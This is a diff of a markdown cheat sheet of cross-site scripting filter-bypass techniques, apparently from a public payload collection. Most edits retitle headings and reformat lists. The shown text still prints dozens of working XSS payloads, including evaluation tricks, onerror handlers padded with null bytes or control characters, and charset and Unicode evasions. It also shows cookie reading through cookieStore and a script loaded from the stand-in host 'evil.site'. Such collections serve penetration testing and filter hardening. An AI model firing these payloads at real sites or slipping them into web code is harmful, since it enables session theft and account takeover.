@@ -2,28 +2,29 @@
 
 ## Summary
 
-- [Bypass case sensitive](#bypass-case-sensitive)
-- [Bypass tag blacklist](#bypass-tag-blacklist)
-- [Bypass word blacklist with code evaluation](#bypass-word-blacklist-with-code-evaluation)
-- [Bypass with incomplete html tag](#bypass-with-incomplete-html-tag)
-- [Bypass quotes for string](#bypass-quotes-for-string)
-- [Bypass quotes in script tag](#bypass-quotes-in-script-tag)
-- [Bypass quotes in mousedown event](#bypass-quotes-in-mousedown-event)
-- [Bypass dot filter](#bypass-dot-filter)
-- [Bypass parenthesis for string](#bypass-parenthesis-for-string)
-- [Bypass parenthesis and semi colon](#bypass-parenthesis-and-semi-colon)
-- [Bypass onxxxx= blacklist](#bypass-onxxxx-blacklist)
-- [Bypass space filter](#bypass-space-filter)
-- [Bypass email filter](#bypass-email-filter)
-- [Bypass document blacklist](#bypass-document-blacklist)
-- [Bypass document.cookie blacklist](#bypass-document-cookie-blacklist)
-- [Bypass using javascript inside a string](#bypass-using-javascript-inside-a-string)
-- [Bypass using an alternate way to redirect](#bypass-using-an-alternate-way-to-redirect)
-- [Bypass using an alternate way to execute an alert](#bypass-using-an-alternate-way-to-execute-an-alert)
-- [Bypass ">" using nothing](#bypass--using-nothing)
+- [Bypass Case Sensitive](#bypass-case-sensitive)
+- [Bypass Tag Blacklist](#bypass-tag-blacklist)
+- [Bypass Word Blacklist with Code Evaluation](#bypass-word-blacklist-with-code-evaluation)
+- [Bypass with Incomplete HTML Tag](#bypass-with-incomplete-html-tag)
+- [Bypass Quotes for String](#bypass-quotes-for-string)
+- [Bypass Quotes in Script Tag](#bypass-quotes-in-script-tag)
+- [Bypass Quotes in Mousedown Event](#bypass-quotes-in-mousedown-event)
+- [Bypass Dot Filter](#bypass-dot-filter)
+- [Bypass Parenthesis for String](#bypass-parenthesis-for-string)
+- [Bypass Parenthesis and Semi Colon](#bypass-parenthesis-and-semi-colon)
+- [Bypass onxxxx= Blacklist](#bypass-onxxxx-blacklist)
+- [Bypass Space Filter](#bypass-space-filter)
+- [Bypass Email Filter](#bypass-email-filter)
+- [Bypass Tel URI Filter](#bypass-tel-uri-filter)
+- [Bypass document Blacklist](#bypass-document-blacklist)
+- [Bypass document.cookie Blacklist](#bypass-document-cookie-blacklist)
+- [Bypass using Javascript Inside a String](#bypass-using-javascript-inside-a-string)
+- [Bypass using an Alternate Way to Redirect](#bypass-using-an-alternate-way-to-redirect)
+- [Bypass using an Alternate Way to Execute an Alert](#bypass-using-an-alternate-way-to-execute-an-alert)
+- [Bypass ">" using Nothing](#bypass--using-nothing)
 - [Bypass "<" and ">" using ＜ and ＞](#bypass--and--using--and-)
-- [Bypass ";" using another character](#bypass--using-another-character)
-- [Bypass using missing charset header](#bypass-using-missing-charset-header)
+- [Bypass ";" using Another Character](#bypass--using-another-character)
+- [Bypass using Missing Charset Header](#bypass-using-missing-charset-header)
 - [Bypass using HTML encoding](#bypass-using-html-encoding)
 - [Bypass using Katakana](#bypass-using-katakana)
 - [Bypass using Cuneiform](#bypass-using-cuneiform)
@@ -36,11 +37,11 @@
 - [Bypass using UTF-16be](#bypass-using-utf-16be)
 - [Bypass using UTF-32](#bypass-using-utf-32)
 - [Bypass using BOM](#bypass-using-bom)
-- [Bypass using jsfuck](#bypass-using-jsfuck)
+- [Bypass using JSfuck](#bypass-using-jsfuck)
 - [References](#references)
 
 
-## Bypass case sensitive
+## Bypass Case Sensitive
 
 To bypass a case-sensitive XSS filter, you can try mixing uppercase and lowercase letters within the tags or function names.
 
@@ -52,14 +53,14 @@ To bypass a case-sensitive XSS filter, you can try mixing uppercase and lowercas
 Since many XSS filters only recognize exact lowercase or uppercase patterns, this can sometimes evade detection by tricking simple case-sensitive filters.
 
 
-## Bypass tag blacklist
+## Bypass Tag Blacklist
 
 ```javascript
 <script x>
 <script x>alert('XSS')<script y>
 ```
 
-## Bypass word blacklist with code evaluation
+## Bypass Word Blacklist with Code Evaluation
 
 ```javascript
 eval('ale'+'rt(0)');
@@ -71,7 +72,7 @@ Set.constructor('ale'+'rt(13)')();
 Set.constructor`al\x65rt\x2814\x29```;
 ```
 
-## Bypass with incomplete html tag
+## Bypass with Incomplete HTML Tag
 
 Works on IE/Firefox/Chrome/Safari
 
@@ -79,13 +80,13 @@ Works on IE/Firefox/Chrome/Safari
 <img src='1' onerror='alert(0)' <
 ```
 
-## Bypass quotes for string
+## Bypass Quotes for String
 
 ```javascript
 String.fromCharCode(88,83,83)
 ```
 
-## Bypass quotes in script tag
+## Bypass Quotes in Script Tag
 
 ```javascript
 http://localhost/bla.php?test=</script><script>alert(1)</script>
@@ -96,7 +97,7 @@ http://localhost/bla.php?test=</script><script>alert(1)</script>
 </html>
 ```
 
-## Bypass quotes in mousedown event
+## Bypass Quotes in Mousedown Event
 
 You can bypass a single quote with &#39; in an on mousedown event handler
 
@@ -104,7 +105,7 @@ You can bypass a single quote with &#39; in an on mousedown event handler
 <a href="" onmousedown="var name = '&#39;;alert(1)//'; alert('smthg')">Link</a>
 ```
 
-## Bypass dot filter
+## Bypass Dot Filter
 
 ```javascript
 <script>window['alert'](document['domain'])</script>
@@ -119,60 +120,74 @@ http://www.geektools.com/cgi-bin/ipconv.cgi
 
 Base64 encoding your XSS payload with Linux command: IE. `echo -n "alert(document.cookie)" | base64` == `YWxlcnQoZG9jdW1lbnQuY29va2llKQ==`
 
-## Bypass parenthesis for string
+## Bypass Parenthesis for String
 
 ```javascript
 alert`1`
 setTimeout`alert\u0028document.domain\u0029`;
 ```
 
-## Bypass parenthesis and semi colon
+## Bypass Parenthesis and Semi Colon
 
-```javascript
-// From @garethheyes
-<script>onerror=alert;throw 1337</script>
-<script>{onerror=alert}throw 1337</script>
-<script>throw onerror=alert,'some string',123,'haha'</script>
+* From @garethheyes
+    ```javascript
+    <script>onerror=alert;throw 1337</script>
+    <script>{onerror=alert}throw 1337</script>
+    <script>throw onerror=alert,'some string',123,'haha'</script>
+    ```
 
-// From @terjanq
-<script>throw/a/,Uncaught=1,g=alert,a=URL+0,onerror=eval,/1/g+a[12]+[1337]+a[13]</script>
+* From @terjanq
+    ```js
+    <script>throw/a/,Uncaught=1,g=alert,a=URL+0,onerror=eval,/1/g+a[12]+[1337]+a[13]</script>
+    ```
 
-// From @cgvwzq
-<script>TypeError.prototype.name ='=/',0[onerror=eval]['/-alert(1)//']</script>
-```
+* From @cgvwzq
+    ```js
+    <script>TypeError.prototype.name ='=/',0[onerror=eval]['/-alert(1)//']</script>
+    ```
 
-## Bypass onxxxx= blacklist
+## Bypass onxxxx Blacklist
 
-```javascript
-<object onafterscriptexecute=confirm(0)>
-<object onbeforescriptexecute=confirm(0)>
+* Use less known tag
+    ```html
+    <object onafterscriptexecute=confirm(0)>
+    <object onbeforescriptexecute=confirm(0)>
+    ```
 
-// Bypass onxxx= filter with a null byte/vertical tab/Carriage Return/Line Feed
-<img src='1' onerror\x00=alert(0) />
-<img src='1' onerror\x0b=alert(0) />
-<img src='1' onerror\x0d=alert(0) />
-<img src='1' onerror\x0a=alert(0) />
+* Bypass onxxx= filter with a null byte/vertical tab/Carriage Return/Line Feed
+    ```html
+    <img src='1' onerror\x00=alert(0) />
+    <img src='1' onerror\x0b=alert(0) />
+    <img src='1' onerror\x0d=alert(0) />
+    <img src='1' onerror\x0a=alert(0) />
+    ```
 
-// Bypass onxxx= filter with a '/'
-<img src='1' onerror/=alert(0) />
-```
+* Bypass onxxx= filter with a '/'
+    ```js
+    <img src='1' onerror/=alert(0) />
+    ```
 
-## Bypass space filter
 
-```javascript
-// Bypass space filter with "/"
-<img/src='1'/onerror=alert(0)>
+## Bypass Space Filter
 
-// Bypass space filter with 0x0c/^L or 0x0d/^M or 0x0a/^J or 0x09/^I
-<svgonload=alert(1)>
+* Bypass space filter with "/"
+    ```javascript
+    <img/src='1'/onerror=alert(0)>
+    ```
 
+* Bypass space filter with `0x0c/^L` or `0x0d/^M` or `0x0a/^J` or `0x09/^I`
+  ```html
+  <svgonload=alert(1)>
+  ```
+
+```ps1
 $ echo "<svg^Lonload^L=^Lalert(1)^L>" | xxd
 00000000: 3c73 7667 0c6f 6e6c 6f61 640c 3d0c 616c  <svg.onload.=.al
 00000010: 6572 7428 3129 0c3e 0a                   ert(1).>.
 ```
 
 
-## Bypass email filter
+## Bypass Email Filter
 
 * [RFC0822 compliant](http://sphinx.mythic-beasts.com/~pdw/cgi-bin/emailvalidate)
   ```javascript
@@ -185,7 +200,7 @@ $ echo "<svg^Lonload^L=^Lalert(1)^L>" | xxd
   ```
 
 
-## Bypass tel URI filter
+## Bypass Tel URI Filter
 
 At least 2 RFC mention the `;phone-context=` descriptor:
 
@@ -197,22 +212,22 @@ At least 2 RFC mention the `;phone-context=` descriptor:
 ```
 
 
-## Bypass document blacklist
+## Bypass Document Blacklist
 
 ```javascript
 <div id = "x"></div><script>alert(x.parentNode.parentNode.parentNode.location)</script>
 window["doc"+"ument"]
 ```
 
-## Bypass document.cookie blacklist
+## Bypass document.cookie Blacklist
 
 This is another way to access cookies on Chrome, Edge, and Opera. Replace COOKIE NAME with the cookie you are after. You may also investigate the getAll() method if that suits your requirements.
 
-```
+```js
 window.cookieStore.get('COOKIE NAME').then((cookieValue)=>{alert(cookieValue.value);});
 ```
 
-## Bypass using javascript inside a string
+## Bypass using Javascript Inside a String
 
 ```javascript
 <script>
@@ -220,7 +235,7 @@ foo="text </script><script>alert(1)</script>";
 </script>
 ```
 
-## Bypass using an alternate way to redirect
+## Bypass using an Alternate Way to Redirect
 
 ```javascript
 location="http://google.com"
@@ -230,7 +245,7 @@ window.location.assign("http://google.com")
 window['location']['href']="http://google.com"
 ```
 
-## Bypass using an alternate way to execute an alert
+## Bypass using an Alternate Way to Execute an Alert
 
 From [@brutelogic](https://twitter.com/brutelogic/status/965642032424407040) tweet.
 
@@ -271,14 +286,15 @@ self[Object.keys(self)[5]]("1") // alert("1")
 We can find "alert" with a regular expression like ^a[rel]+t$ :
 
 ```javascript
-a=()=>{c=0;for(i in self){if(/^a[rel]+t$/.test(i)){return c}c++}} //bind function alert on new function a()
+//bind function alert on new function a()
+a=()=>{c=0;for(i in self){if(/^a[rel]+t$/.test(i)){return c}c++}} 
 
 // then you can use a() with Object.keys
-
 self[Object.keys(self)[a()]]("1") // alert("1")
 ```
 
 Oneliner:
+
 ```javascript
 a=()=>{c=0;for(i in self){if(/^a[rel]+t$/.test(i)){return c}c++}};self[Object.keys(self)[a()]]("1")
 ```
@@ -339,9 +355,9 @@ XSSObject.proxy = function (obj, name, report_function_name, exec_original) {
 XSSObject.proxy(window, 'alert', 'window.alert', false);
 ```
 
-## Bypass ">" using nothing
+## Bypass ">" using Nothing
 
-You don't need to close your tags.
+There is no need to close the tags, the browser will try to fix it.
 
 ```javascript
 <svg onload=alert(1)//
@@ -355,7 +371,7 @@ Use Unicode characters `U+FF1C` and `U+FF1E`, refer to [Bypass using Unicode](#b
 ＜script/src=//evil.site/poc.js＞
 ```
 
-## Bypass ";" using another character
+## Bypass ";" using Another Character
 
 ```javascript
 'te' * alert('*') * 'xt';
@@ -376,7 +392,7 @@ Use Unicode characters `U+FF1C` and `U+FF1E`, refer to [Bypass using Unicode](#b
 ```
 
 
-## Bypass using missing charset header
+## Bypass using Missing Charset Header
 
 **Requirements**:
 
@@ -409,7 +425,7 @@ Use `%1b(J` to force convert a `\'` (ascii) in to `¥'` (JIS X 0201 1976), unesc
 Payload: `search=%1b(J&lang=en";alert(1)//`
 
 
-## Bypass using HTML encoding
+## Bypass using HTML Encoding
 
 ```javascript
 %26%2397;lert(1)
@@ -556,7 +572,7 @@ XSS : %00%00%fe%ff%00%00%00%3C%00%00%00s%00%00%00v%00%00%00g%00%00%00/%00%00%00o
 ```
 
 
-## Bypass using jsfuck
+## Bypass using JSfuck
 
 Bypass using [jsfuck](http://www.jsfuck.com/)
 
